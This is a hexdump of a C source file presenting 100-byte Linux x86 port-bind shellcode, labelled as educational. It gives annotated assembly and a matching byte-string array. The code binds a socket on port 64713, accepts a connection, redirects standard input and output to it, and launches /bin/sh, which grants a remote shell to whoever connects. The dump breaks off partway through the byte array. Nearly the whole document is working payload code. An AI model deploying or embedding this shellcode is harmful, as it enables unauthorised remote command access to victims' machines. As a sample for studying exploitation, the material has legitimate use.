00000000  2f 2a 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |/*--------------|
00000010  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000040  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2a 0d 0a  |-------------*..|
00000050  20 2a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  | *              |
00000060  20 20 20 31 30 30 20 62  79 74 65 20 50 6f 72 74  |   100 byte Port|
00000070  62 69 6e 64 20 73 68 65  6c 6c 63 6f 64 65 20 20  |bind shellcode  |
00000080  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000090  20 20 20 20 20 20 20 20  20 20 20 20 20 2a 0d 0a  |             *..|
000000a0  20 2a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  | *              |
000000b0  62 79 20 42 65 6e 6a 61  6d 69 6e 20 4f 72 6f 7a  |by Benjamin Oroz|
000000c0  63 6f 20 2d 20 62 65 6e  6f 72 6f 72 40 67 6d 61  |co - benoror@gma|
000000d0  69 6c 2e 63 6f 6d 20 20  20 20 20 20 20 20 20 20  |il.com          |
000000e0  20 20 20 20 20 20 20 20  20 20 20 20 20 2a 0d 0a  |             *..|
000000f0  20 2a 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  | *--------------|
00000100  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000130  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2a 0d 0a  |-------------*..|
00000140  20 2a 20 20 20 20 66 69  6c 65 6e 61 6d 65 3a 20  | *    filename: |
00000150  78 38 36 2d 6c 69 6e 75  78 2d 70 6f 72 74 62 69  |x86-linux-portbi|
00000160  6e 64 2e 63 20 20 20 20  20 20 20 20 20 20 20 20  |nd.c            |
00000170  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000180  20 20 20 20 20 20 20 20  20 20 20 20 20 2a 0d 0a  |             *..|
00000190  20 2a 20 64 69 73 63 72  69 70 74 69 6f 6e 3a 20  | * discription: |
000001a0  78 38 36 2d 6c 69 6e 75  78 20 70 6f 72 74 62 69  |x86-linux portbi|
000001b0  6e 64 20 73 68 65 6c 6c  63 6f 64 65 2e 09 09 09  |nd shellcode....|
000001c0  09 20 20 20 20 20 2a 0d  0a 20 2a 09 09 50 72 65  |.     *.. *..Pre|
000001d0  74 74 79 20 62 69 67 20  62 75 74 20 65 78 63 65  |tty big but exce|
000001e0  6c 6c 65 6e 74 20 66 6f  72 20 65 64 75 63 61 74  |llent for educat|
000001f0  69 6f 6e 61 6c 20 70 75  72 70 6f 73 65 73 2e 09  |ional purposes..|
00000200  20 20 20 20 20 2a 0d 0a  20 2a 09 09 55 73 65 20  |     *.. *..Use |
00000210  53 45 54 5f 50 4f 52 54  28 29 20 62 65 66 6f 72  |SET_PORT() befor|
00000220  65 20 75 73 69 6e 67 20  74 68 65 20 73 68 65 6c  |e using the shel|
00000230  6c 63 6f 64 65 2e 20 45  78 61 6d 70 6c 65 3a 09  |lcode. Example:.|
00000240  20 20 20 20 20 2a 0d 0a  20 2a 09 09 09 09 09 09  |     *.. *......|
00000250  09 09 09 20 20 20 20 20  2a 0d 0a 20 2a 09 09 09  |...     *.. *...|
00000260  53 45 54 5f 50 4f 52 54  28 73 63 2c 20 33 31 33  |SET_PORT(sc, 313|
00000270  33 37 29 3b 09 09 09 20  20 20 20 20 20 20 20 20  |37);...         |
00000280  20 20 20 20 2a 0d 0a 20  2a 09 09 09 09 09 09 09  |    *.. *.......|
00000290  09 09 20 20 20 20 20 2a  0d 0a 20 2a 5f 5f 5f 5f  |..     *.. *____|
000002a0  5f 5f 5f 5f 5f 5f 5f 5f  5f 5f 5f 5f 5f 5f 5f 5f  |________________|
*
000002e0  5f 5f 5f 5f 5f 5f 5f 2a  0d 0a 20 2a 2d 2d 2d 2d  |_______*.. *----|
000002f0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000330  2d 2d 2d 2d 2d 2d 2d 2a  2f 0d 0a 0d 0a 2f 2a 2d  |-------*/..../*-|
00000340  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000380  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2a 0d 0a 20 2a 09  |----------*.. *.|
00000390  09 09 09 41 53 4d 20 43  6f 64 65 09 20 20 20 20  |...ASM Code.    |
000003a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000003b0  20 20 20 20 20 20 20 20  20 2a 0d 0a 20 2a 2d 2d  |         *.. *--|
000003c0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000400  2d 2d 2d 2d 2d 2d 2d 2d  2d 2a 0d 0a 0d 0a 23 20  |---------*....# |
00000410  73 20 3d 20 73 6f 63 6b  65 74 28 32 2c 20 31 2c  |s = socket(2, 1,|
00000420  20 30 29 0d 0a 70 75 73  68 20 20 20 24 30 78 36  | 0)..push   $0x6|
00000430  36 09 09 09 23 0d 0a 70  6f 70 20 20 20 20 25 65  |6...#..pop    %e|
00000440  61 78 09 09 09 23 20 30  78 36 36 20 3d 20 73 6f  |ax...# 0x66 = so|
00000450  63 6b 65 74 63 61 6c 6c  0d 0a 70 75 73 68 20 20  |cketcall..push  |
00000460  20 24 30 78 31 09 09 09  23 0d 0a 70 6f 70 20 20  | $0x1...#..pop  |
00000470  20 20 25 65 62 78 09 09  09 23 20 73 6f 63 6b 65  |  %ebx...# socke|
00000480  74 28 29 20 3d 20 31 0d  0a 78 6f 72 20 20 20 20  |t() = 1..xor    |
00000490  25 65 63 78 2c 25 65 63  78 09 09 23 0d 0a 70 75  |%ecx,%ecx..#..pu|
000004a0  73 68 20 20 20 25 65 63  78 09 09 09 23 20 30 0d  |sh   %ecx...# 0.|
000004b0  0a 70 75 73 68 20 20 20  24 30 78 31 09 09 09 23  |.push   $0x1...#|
000004c0  20 53 4f 43 4b 5f 53 54  52 45 41 4d 20 3d 20 31  | SOCK_STREAM = 1|
000004d0  0d 0a 70 75 73 68 20 20  20 24 30 78 32 09 09 09  |..push   $0x2...|
000004e0  23 20 41 46 5f 49 4e 45  54 20 3d 20 32 0d 0a 6d  |# AF_INET = 2..m|
000004f0  6f 76 20 20 20 20 25 65  73 70 2c 25 65 63 78 09  |ov    %esp,%ecx.|
00000500  09 23 20 41 72 67 75 6d  65 6e 74 73 0d 0a 69 6e  |.# Arguments..in|
00000510  74 20 20 20 20 24 30 78  38 30 09 09 09 23 20 45  |t    $0x80...# E|
00000520  58 45 43 55 54 45 20 2d  20 4e 6f 77 20 25 65 61  |XECUTE - Now %ea|
00000530  78 20 68 61 76 65 20 74  68 65 20 73 20 66 69 6c  |x have the s fil|
00000540  65 44 65 73 63 72 69 70  74 6f 72 0d 0a 0d 0a 23  |eDescriptor....#|
00000550  20 62 69 6e 64 28 73 20  5b 32 2c 20 36 34 37 31  | bind(s [2, 6471|
00000560  33 2c 20 30 5d 2c 20 30  78 31 30 29 0d 0a 78 6f  |3, 0], 0x10)..xo|
00000570  72 20 20 20 20 25 65 64  78 2c 25 65 64 78 0d 0a  |r    %edx,%edx..|
00000580  70 75 73 68 20 20 20 25  65 64 78 09 09 09 23 20  |push   %edx...# |
00000590  49 4e 41 44 44 52 5f 41  4e 59 20 3d 20 30 0d 0a  |INADDR_ANY = 0..|
000005a0  70 75 73 68 77 20 20 24  30 78 63 39 66 63 09 09  |pushw  $0xc9fc..|
000005b0  09 23 20 50 4f 52 54 20  3d 20 36 34 37 31 33 0d  |.# PORT = 64713.|
000005c0  0a 70 75 73 68 77 20 20  24 30 78 32 09 09 09 23  |.pushw  $0x2...#|
000005d0  20 41 46 5f 49 4e 45 54  20 3d 20 32 0d 0a 6d 6f  | AF_INET = 2..mo|
000005e0  76 20 20 20 20 25 65 73  70 2c 25 65 63 78 09 09  |v    %esp,%ecx..|
000005f0  23 20 25 65 63 78 20 68  6f 6c 64 73 20 73 65 72  |# %ecx holds ser|
00000600  76 65 72 20 73 74 72 75  63 74 0d 0a 70 75 73 68  |ver struct..push|
00000610  20 20 20 24 30 78 31 30  09 09 09 23 20 73 69 7a  |   $0x10...# siz|
00000620  65 6f 66 28 73 65 72 76  65 72 29 20 3d 20 31 30  |eof(server) = 10|
00000630  0d 0a 70 75 73 68 20 20  20 25 65 63 78 09 09 09  |..push   %ecx...|
00000640  23 20 73 65 72 76 65 72  20 73 74 72 75 63 74 0d  |# server struct.|
00000650  0a 70 75 73 68 20 20 20  25 65 61 78 09 09 09 23  |.push   %eax...#|
00000660  20 73 20 66 69 6c 65 44  65 73 63 72 69 70 74 6f  | s fileDescripto|
00000670  72 0d 0a 6d 6f 76 20 20  20 20 25 65 73 70 2c 25  |r..mov    %esp,%|
00000680  65 63 78 0d 0a 6d 6f 76  20 20 20 20 25 65 61 78  |ecx..mov    %eax|
00000690  2c 25 65 73 69 09 09 23  20 6e 6f 77 20 25 65 73  |,%esi..# now %es|
000006a0  69 20 68 6f 6c 64 73 20  73 20 66 69 6c 65 44 65  |i holds s fileDe|
000006b0  73 63 72 69 70 74 6f 72  0d 0a 70 75 73 68 20 20  |scriptor..push  |
000006c0  20 24 30 78 32 09 09 09  23 0d 0a 70 6f 70 20 20  | $0x2...#..pop  |
000006d0  20 20 25 65 62 78 09 09  09 23 20 62 69 6e 64 28  |  %ebx...# bind(|
000006e0  29 20 3d 20 32 0d 0a 70  75 73 68 20 20 20 24 30  |) = 2..push   $0|
000006f0  78 36 36 09 09 09 23 0d  0a 70 6f 70 20 20 20 20  |x66...#..pop    |
00000700  25 65 61 78 09 09 09 23  20 30 78 36 36 20 3d 20  |%eax...# 0x66 = |
00000710  73 6f 63 6b 65 74 63 61  6c 6c 0d 0a 69 6e 74 20  |socketcall..int |
00000720  20 20 20 24 30 78 38 30  09 09 09 23 20 4f 6e 20  |   $0x80...# On |
00000730  73 75 63 63 65 73 73 3a  20 25 65 61 78 20 3d 20  |success: %eax = |
00000740  30 0d 0a 0d 0a 23 20 6c  69 73 74 65 6e 28 73 2c  |0....# listen(s,|
00000750  20 30 29 0d 0a 70 75 73  68 20 20 20 24 30 78 36  | 0)..push   $0x6|
00000760  36 09 09 09 23 0d 0a 70  6f 70 20 20 20 20 25 65  |6...#..pop    %e|
00000770  61 78 09 09 09 23 20 30  78 36 36 20 3d 20 73 6f  |ax...# 0x66 = so|
00000780  63 6b 65 74 63 61 6c 6c  0d 0a 70 75 73 68 20 20  |cketcall..push  |
00000790  20 24 30 78 34 09 09 09  23 0d 0a 70 6f 70 20 20  | $0x4...#..pop  |
000007a0  20 20 25 65 62 78 09 09  09 23 20 6c 69 73 74 65  |  %ebx...# liste|
000007b0  6e 28 29 20 3d 20 34 0d  0a 69 6e 74 20 20 20 20  |n() = 4..int    |
000007c0  24 30 78 38 30 09 09 09  23 20 4f 6e 20 73 75 63  |$0x80...# On suc|
000007d0  63 65 73 73 3a 20 25 65  61 78 20 3d 20 30 0d 0a  |cess: %eax = 0..|
000007e0  0d 0a 23 20 63 20 3d 20  61 63 63 65 70 74 28 73  |..# c = accept(s|
000007f0  2c 20 30 2c 20 30 29 0d  0a 78 6f 72 20 20 20 20  |, 0, 0)..xor    |
00000800  25 65 63 78 2c 25 65 63  78 0d 0a 70 75 73 68 20  |%ecx,%ecx..push |
00000810  20 20 25 65 63 78 0d 0a  70 75 73 68 20 20 20 25  |  %ecx..push   %|
00000820  65 63 78 0d 0a 70 75 73  68 20 20 20 25 65 73 69  |ecx..push   %esi|
00000830  09 09 09 23 20 25 65 73  69 20 3d 20 73 0d 0a 6d  |...# %esi = s..m|
00000840  6f 76 20 20 20 20 25 65  73 70 2c 25 65 63 78 09  |ov    %esp,%ecx.|
00000850  09 23 20 41 72 67 75 6d  65 6e 74 73 0d 0a 70 75  |.# Arguments..pu|
00000860  73 68 20 20 20 24 30 78  35 09 09 09 23 0d 0a 70  |sh   $0x5...#..p|
00000870  6f 70 20 20 20 20 25 65  62 78 09 09 09 23 20 61  |op    %ebx...# a|
00000880  63 63 65 70 74 28 29 20  3d 20 35 0d 0a 70 75 73  |ccept() = 5..pus|
00000890  68 20 20 20 24 30 78 36  36 09 09 09 23 0d 0a 70  |h   $0x66...#..p|
000008a0  6f 70 20 20 20 20 25 65  61 78 09 09 09 23 20 30  |op    %eax...# 0|
000008b0  78 36 36 20 3d 20 73 6f  63 6b 65 74 63 61 6c 6c  |x66 = socketcall|
000008c0  0d 0a 69 6e 74 20 20 20  20 24 30 78 38 30 09 09  |..int    $0x80..|
000008d0  09 23 20 45 58 45 43 55  54 45 20 2d 20 4e 6f 77  |.# EXECUTE - Now|
000008e0  20 25 65 61 78 20 68 61  76 65 20 63 20 66 69 6c  | %eax have c fil|
000008f0  65 44 65 73 63 72 69 70  74 6f 72 0d 0a 0d 0a 23  |eDescriptor....#|
00000900  20 64 75 70 32 28 63 2c  20 32 29 20 2c 20 64 75  | dup2(c, 2) , du|
00000910  70 32 28 63 2c 20 31 29  20 2c 20 64 75 70 32 28  |p2(c, 1) , dup2(|
00000920  63 2c 20 30 29 0d 0a 78  63 68 67 20 20 20 25 65  |c, 0)..xchg   %e|
00000930  61 78 2c 25 65 62 78 20  20 20 20 20 20 20 20 09  |ax,%ebx        .|
00000940  23 20 50 75 74 20 63 20  66 69 6c 65 44 65 73 63  |# Put c fileDesc|
00000950  72 69 70 74 6f 72 20 6f  6e 20 25 65 62 78 20 5b  |riptor on %ebx [|
00000960  66 6f 72 20 64 75 70 32  28 29 5d 0d 0a 70 75 73  |for dup2()]..pus|
00000970  68 20 20 20 24 30 78 32  0d 0a 70 6f 70 20 20 20  |h   $0x2..pop   |
00000980  20 25 65 63 78 0d 0a 64  75 70 5f 6c 6f 6f 70 3a  | %ecx..dup_loop:|
00000990  0d 0a 6d 6f 76 20 20 20  20 24 30 78 33 66 2c 25  |..mov    $0x3f,%|
000009a0  61 6c 09 09 23 20 64 75  70 32 28 29 20 3d 20 30  |al..# dup2() = 0|
000009b0  78 33 66 0d 0a 69 6e 74  20 20 20 20 24 30 78 38  |x3f..int    $0x8|
000009c0  30 0d 0a 64 65 63 20 20  20 20 25 65 63 78 0d 0a  |0..dec    %ecx..|
000009d0  6a 6e 73 20 20 20 20 64  75 70 5f 6c 6f 6f 70 0d  |jns    dup_loop.|
000009e0  0a 0d 0a 23 20 65 78 65  63 76 65 28 22 2f 62 69  |...# execve("/bi|
000009f0  6e 2f 2f 73 68 22 2c 20  5b 22 2f 62 69 6e 2f 2f  |n//sh", ["/bin//|
00000a00  73 68 22 2c 4e 55 4c 4c  5d 29 0d 0a 6d 6f 76 20  |sh",NULL])..mov |
00000a10  20 20 20 24 30 78 62 2c  25 61 6c 09 09 09 23 20  |   $0xb,%al...# |
00000a20  65 78 65 63 76 65 20 3d  20 31 31 64 0d 0a 70 75  |execve = 11d..pu|
00000a30  73 68 20 20 20 25 65 64  78 0d 0a 70 75 73 68 20  |sh   %edx..push |
00000a40  20 20 24 30 78 36 38 37  33 32 66 32 66 0d 0a 70  |  $0x68732f2f..p|
00000a50  75 73 68 20 20 20 24 30  78 36 65 36 39 36 32 32  |ush   $0x6e69622|
00000a60  66 0d 0a 6d 6f 76 20 20  20 20 25 65 73 70 2c 25  |f..mov    %esp,%|
00000a70  65 62 78 0d 0a 70 75 73  68 20 20 20 25 65 64 78  |ebx..push   %edx|
00000a80  0d 0a 70 75 73 68 20 20  20 25 65 62 78 0d 0a 6d  |..push   %ebx..m|
00000a90  6f 76 20 20 20 20 25 65  73 70 2c 20 25 65 63 78  |ov    %esp, %ecx|
00000aa0  0d 0a 69 6e 74 20 20 20  20 24 30 78 38 30 0d 0a  |..int    $0x80..|
00000ab0  0d 0a 2a 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |..*-------------|
00000ac0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000af0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2a  |---------------*|
00000b00  2f 0d 0a 0d 0a 63 68 61  72 20 73 63 5b 5d 20 3d  |/....char sc[] =|
00000b10  09 0d 0a 22 5c 78 36 61  5c 78 36 36 22 20 20 20  |..."\x6a\x66"   |
00000b20  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000b30  09 2f 2f 70 75 73 68 20  20 20 24 30 78 36 36 0d  |.//push   $0x66.|
00000b40  0a 22 5c 78 35 38 22 20  20 20 20 20 20 20 20 20  |."\x58"         |
00000b50  20 20 20 20 20 20 20 20  20 20 20 20 20 09 2f 2f  |             .//|
00000b60  70 6f 70 20 20 20 20 25  65 61 78 0d 0a 22 5c 78  |pop    %eax.."\x|
00000b70  36 61 5c 78 30 31 22 20  20 20 20 20 20 20 20 20  |6a\x01"         |
00000b80  20 20 20 20 20 20 20 20  20 20 09 2f 2f 70 75 73  |          .//pus|
00000b90  68 20 20 20 24 30 78 31  0d 0a 22 5c 78 35 62 22  |h   $0x1.."\x5b"|
00000ba0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000bb0  20 20 20 20 20 20 09 2f  2f 70 6f 70 20 20 20 20  |      .//pop    |
00000bc0  25 65 62 78 0d 0a 22 5c  78 33 31 5c 78 63 39 22  |%ebx.."\x31\xc9"|
00000bd0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000be0  20 20 20 09 2f 2f 78 6f  72 20 20 20 20 25 65 63  |   .//xor    %ec|
00000bf0  78 2c 25 65 63 78 0d 0a  22 5c 78 35 31 22 20 20  |x,%ecx.."\x51"  |
00000c00  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000c10  20 20 20 20 09 2f 2f 70  75 73 68 20 20 20 25 65  |    .//push   %e|
00000c20  63 78 0d 0a 22 5c 78 36  61 5c 78 30 31 22 20 20  |cx.."\x6a\x01"  |
00000c30  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000c40  20 09 2f 2f 70 75 73 68  20 20 20 24 30 78 31 0d  | .//push   $0x1.|
00000c50  0a 22 5c 78 36 61 5c 78  30 32 22 20 20 20 20 20  |."\x6a\x02"     |
00000c60  20 20 20 20 20 20 20 20  20 20 20 20 20 20 09 2f  |              ./|
00000c70  2f 70 75 73 68 20 20 20  24 30 78 32 0d 0a 22 5c  |/push   $0x2.."\|
00000c80  78 38 39 5c 78 65 31 22  20 20 20 20 20 20 20 20  |x89\xe1"        |
00000c90  20 20 20 20 20 20 20 20  20 20 20 09 2f 2f 6d 6f  |           .//mo|
00000ca0  76 20 20 20 20 25 65 73  70 2c 25 65 63 78 0d 0a  |v    %esp,%ecx..|
00000cb0  22 5c 78 63 64 5c 78 38  30 22 20 20 20 20 20 20  |"\xcd\x80"      |
00000cc0  20 20 20 20 20 20 20 20  20 20 20 20 20 09 2f 2f  |             .//|
00000cd0  69 6e 74 20 20 20 20 24  30 78 38 30 0d 0a 22 5c  |int    $0x80.."\|
00000ce0  78 33 31 5c 78 64 32 22  20 20 20 20 20 20 20 20  |x31\xd2"        |
00000cf0  20 20 20 20 20 20 20 20  20 20 20 09 2f 2f 78 6f  |           .//xo|
00000d00  72 20 20 20 20 25 65 64  78 2c 25 65 64 78 0d 0a  |r    %edx,%edx..|
00000d10  22 5c 78 35 32 22 20 20  20 20 20 20 20 20 20 20  |"\x52"          |
00000d20  20 20 20 20 20 20 20 20  20 20 20 20 09 2f 2f 70  |            .//p|
00000d30  75 73 68 20 20 20 25 65  64 78 0d 0a 22 5c 78 36  |ush   %edx.."\x6|
00000d40  36 5c 78 36 38 5c 78 66  63 5c 78 63 39 22 20 20  |6\x68\xfc\xc9"  |
00000d50  20 20 20 20 20 20 20 20  20 20 20 09 2f 2f 70 75  |           .//pu|
00000d60  73 68 77 20 20 24 30 78  63 39 66 63 09 2f 2f 50  |shw  $0xc9fc.//P|
00000d70  4f 52 54 0d 0a 22 5c 78  36 36 5c 78 36 61 5c 78  |ORT.."\x66\x6a\x|
00000d80  30 32 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |02"             |
00000d90  20 20 20 09 2f 2f 70 75  73 68 77 20 20 24 30 78  |   .//pushw  $0x|
00000da0  32 0d 0a 22 5c 78 38 39  5c 78 65 31 22 20 20 20  |2.."\x89\xe1"   |
00000db0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000dc0  09 2f 2f 6d 6f 76 20 20  20 20 25 65 73 70 2c 25  |.//mov    %esp,%|
00000dd0  65 63 78 0d 0a 22 5c 78  36 61 5c 78 31 30 22 20  |ecx.."\x6a\x10" |
00000de0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000df0  20 20 09 2f 2f 70 75 73  68 20 20 20 24 30 78 31  |  .//push   $0x1|
00000e00  30 0d 0a 22 5c 78 35 31  22 20 20 20 20 20 20 20  |0.."\x51"       |
00000e10  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 09  |               .|
00000e20  2f 2f 70 75 73 68 20 20  20 25 65 63 78 0d 0a 22  |//push   %ecx.."|
00000e30  5c 78 35 30 22 20 20 20  20 20 20 20 20 20 20 20  |\x50"           |
00000e40  20 20 20 20 20 20 20 20  20 20 20 09 2f 2f 70 75  |           .//pu|
00000e50  73 68 20 20 20 25 65 61  78 0d 0a 22 5c 78 38 39  |sh   %eax.."\x89|
00000e60  5c 78 65 31 22 20 20 20  20 20 20 20 20 20 20 20  |\xe1"           |
00000e70  20 20 20 20 20 20 20 20  09 2f 2f 6d 6f 76 20 20  |        .//mov  |
00000e80  20 20 25 65 73 70 2c 25  65 63 78 0d 0a 22 5c 78  |  %esp,%ecx.."\x|
00000e90  38 39 5c 78 63 36 22 20  20 20 20 20 20 20 20 20  |89\xc6"         |
00000ea0  20 20 20 20 20 20 20 20  20 20 09 2f 2f 6d 6f 76  |          .//mov|
00000eb0  20 20 20 20 25 65 61 78  2c 25 65 73 69 0d 0a 22  |    %eax,%esi.."|
00000ec0  5c 78 36 61 5c 78 30 32  22 20 20 20 20 20 20 20  |\x6a\x02"       |
00000ed0  20 20 20 20 20 20 20 20  20 20 20 20 09 2f 2f 70  |            .//p|
00000ee0  75 73 68 20 20 20 24 30  78 32 0d 0a 22 5c 78 35  |ush   $0x2.."\x5|
00000ef0  62 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |b"              |
00000f00  20 20 20 20 20 20 20 20  09 2f 2f 70 6f 70 20 20  |        .//pop  |
00000f10  20 20 25 65 62 78 0d 0a  22 5c 78 36 61 5c 78 36  |  %ebx.."\x6a\x6|
00000f20  36 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |6"              |
00000f30  20 20 20 20 20 09 2f 2f  70 75 73 68 20 20 20 24  |     .//push   $|
00000f40  30 78 36 36 0d 0a 22 5c  78 35 38 22 20 20 20 20  |0x66.."\x58"    |
00000f50  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000f60  20 20 09 2f 2f 70 6f 70  20 20 20 20 25 65 61 78  |  .//pop    %eax|
00000f70  0d 0a 22 5c 78 63 64 5c  78 38 30 22 20 20 20 20  |.."\xcd\x80"    |
00000f80  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 09  |               .|
00000f90  2f 2f 69 6e 74 20 20 20  20 24 30 78 38 30 0d 0a  |//int    $0x80..|
00000fa0  22 5c 78 36 61 5c 78 36  36 22 20 20 20 20 20 20  |"\x6a\x66"      |
00000fb0  20 20 20 20 20 20 20 20  20 20 20 20 20 09 2f 2f  |             .//|
00000fc0  70 75 73 68 20 20 20 24  30 78 36 36 0d 0a 22 5c  |push   $0x66.."\|
00000fd0  78 35 38 22 20 20 20 20  20 20 20 20 20 20 20 20  |x58"            |
00000fe0  20 20 20 20 20 20 20 20  20 20 09 2f 2f 70 6f 70  |          .//pop|
00000ff0  20 20 20 20 25 65 61 78  0d 0a 22 5c 78 36 61 5c  |    %eax.."\x6a\|
00001000  78 30 34 22 20 20 20 20  20 20 20 20 20 20 20 20  |x04"            |
00001010  20 20 20 20 20 20 20 09  2f 2f 70 75 73 68 20 20  |       .//push  |
00001020  20 24 30 78 34 0d 0a 22  5c 78 35 62 22 20 20 20  | $0x4.."\x5b"   |
00001030  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001040  20 20 20 09 2f 2f 70 6f  70 20 20 20 20 25 65 62  |   .//pop    %eb|
00001050  78 0d 0a 22 5c 78 63 64  5c 78 38 30 22 20 20 20  |x.."\xcd\x80"   |
00001060  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001070  09 2f 2f 69 6e 74 20 20  20 20 24 30 78 38 30 0d  |.//int    $0x80.|
00001080  0a 22 5c 78 33 31 5c 78  63 39 22 20 20 20 20 20  |."\x31\xc9"     |
00001090  20 20 20 20 20 20 20 20  20 20 20 20 20 20 09 2f  |              ./|
000010a0  2f 78 6f 72 20 20 20 20  25 65 63 78 2c 25 65 63  |/xor    %ecx,%ec|
000010b0  78 0d 0a 22 5c 78 35 31  22 20 20 20 20 20 20 20  |x.."\x51"       |
000010c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 09  |               .|
000010d0  2f 2f 70 75 73 68 20 20  20 25 65 63 78 0d 0a 22  |//push   %ecx.."|
000010e0  5c 78 35 31 22 20 20 20  20 20 20 20 20 20 20 20  |\x51"           |
000010f0  20 20 20 20 20 20 20 20  20 20 20 09 2f 2f 70 75  |           .//pu|
00001100  73 68 20 20 20 25 65 63  78 0d 0a 22 5c 78 35 36  |sh   %ecx.."\x56|
00001110  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
00001120  20 20 20 20 20 20 20 09  2f 2f 70 75 73 68 20 20  |       .//push  |
00001130  20 25 65 73 69 0d 0a 22  5c 78 38 39 5c 78 65 31  | %esi.."\x89\xe1|
00001140  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
00001150  20 20 20 20 09 2f 2f 6d  6f 76 20 20 20 20 25 65  |    .//mov    %e|
00001160  73 70 2c 25 65 63 78 0d  0a 22 5c 78 36 61 5c 78  |sp,%ecx.."\x6a\x|
00001170  30 35 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |05"             |
00001180  20 20 20 20 20 20 09 2f  2f 70 75 73 68 20 20 20  |      .//push   |
00001190  24 30 78 35 0d 0a 22 5c  78 35 62 22 20 20 20 20  |$0x5.."\x5b"    |
000011a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000011b0  20 20 09 2f 2f 70 6f 70  20 20 20 20 25 65 62 78  |  .//pop    %ebx|
000011c0  0d 0a 22 5c 78 36 61 5c  78 36 36 22 20 20 20 20  |.."\x6a\x66"    |
000011d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 09  |               .|
000011e0  2f 2f 70 75 73 68 20 20  20 24 30 78 36 36 0d 0a  |//push   $0x66..|
000011f0  22 5c 78 35 38 22 20 20  20 20 20 20 20 20 20 20  |"\x58"          |
00001200  20 20 20 20 20 20 20 20  20 20 20 20 09 2f 2f 70  |            .//p|
00001210  6f 70 20 20 20 20 25 65  61 78 0d 0a 22 5c 78 63  |op    %eax.."\xc|
00001220  64 5c 78 38 30 22 20 20  20 20 20 20 20 20 20 20  |d\x80"          |
00001230  20 20 20 20 20 20 20 20  20 09 2f 2f 69 6e 74 20  |         .//int |
00001240  20 20 20 24 30 78 38 30  0d 0a 22 5c 78 39 33 22  |   $0x80.."\x93"|
00001250  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001260  20 20 20 20 20 20 09 2f  2f 78 63 68 67 20 20 20  |      .//xchg   |
00001270  25 65 61 78 2c 25 65 62  78 0d 0a 22 5c 78 36 61  |%eax,%ebx.."\x6a|
00001280  5c 78 30 32 22 20 20 20  20 20 20 20 20 20 20 20  |\x02"           |
00001290  20 20 20 20 20 20 20 20  09 2f 2f 70 75 73 68 20  |        .//push |
000012a0  20 20 24 30 78 32 0d 0a  22 5c 78 35 39 22 20 20  |  $0x2.."\x59"  |
000012b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000012c0  20 20 20 20 09 2f 2f 70  6f 70 20 20 20 20 25 65  |    .//pop    %e|
000012d0  63 78 0d 0a 22 5c 78 62  30 5c 78 33 66 22 20 20  |cx.."\xb0\x3f"  |
000012e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000012f0  20 09 2f 2f 6d 6f 76 20  20 20 20 24 30 78 33 66  | .//mov    $0x3f|
00001300  2c 25 61 6c 0d 0a 22 5c  78 63 64 5c 78 38 30 22  |,%al.."\xcd\x80"|
00001310  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001320  20 20 20 09 2f 2f 69 6e  74 20 20 20 20 24 30 78  |   .//int    $0x|
00001330  38 30 0d 0a 22 5c 78 34  39 22 20 20 20 20 20 20  |80.."\x49"      |
00001340  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001350  09 2f 2f 64 65 63 20 20  20 20 25 65 63 78 0d 0a  |.//dec    %ecx..|
00001360  22 5c 78 37 39 5c 78 66  39 22 20 20 20 20 20 20  |"\x79\xf9"      |
00001370  20 20 20 20 20 20 20 20  20 20 20 20 20 09 2f 2f  |             .//|
